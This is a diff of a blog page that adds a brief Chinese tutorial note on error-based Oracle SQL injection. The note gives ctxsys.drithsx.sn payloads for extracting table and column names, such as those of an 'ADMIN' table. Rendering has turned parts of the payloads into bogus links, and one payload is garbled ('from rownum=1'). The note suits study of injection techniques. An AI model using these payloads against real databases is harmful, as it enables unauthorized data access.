@@ -18,12 +18,25 @@
     <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
     <div class="post-title">
         <p>
-            archive
+            Oracle Injection
         </p>
         <hr>
     </div>
     <div class="post-content">
-        
+        <h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1>
+<p>所用到的语句</p>
+<ul>
+<li>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(payload))</li>
+<li>table_name&lt;&gt;‘ADMIN’    //&lt;&gt;意思是 不等于。也就是排除</li>
+</ul>
+<p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select table_name from user_tables from rownum=1))</p>
+<ul>
+<li>⏫rownum指，限制输出只输出一个。查询表</li>
+</ul>
+<p><img src="5.jpg" alt="5"></p>
+<p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1))</p>
+<p><img src="8.jpg" alt="8"></p>
+
     </div>
     
         <hr class="fhr">
